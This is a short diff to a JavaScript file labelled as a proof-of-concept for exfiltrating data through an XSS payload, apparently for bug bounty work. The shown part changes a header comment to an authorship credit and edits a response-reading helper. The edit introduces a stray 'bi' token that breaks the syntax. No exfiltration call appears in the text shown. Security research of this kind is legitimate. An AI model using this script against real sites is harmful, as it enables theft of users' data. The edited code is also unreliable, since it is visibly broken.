@@ -1,11 +1,12 @@
 // Proof-of-Concept: Data Exfiltration through XSS Payload
-// This script demonstrates stealing sensitive data via an XSS payload.
+// Made from C0dy 
+// used in bug bounty hunting web enviroment 
 
 function read_body(xhr) {
     var data;
 
     // Determine the response type and retrieve data accordingly
-    if (!xhr.responseType || xhr.responseType === "text") {
+    if (!xhr.responseType || xhr.responseType === "text") {bi
         data = xhr.responseText;
     } else if (xhr.responseType === "document") {
         data = xhr.responseXML;
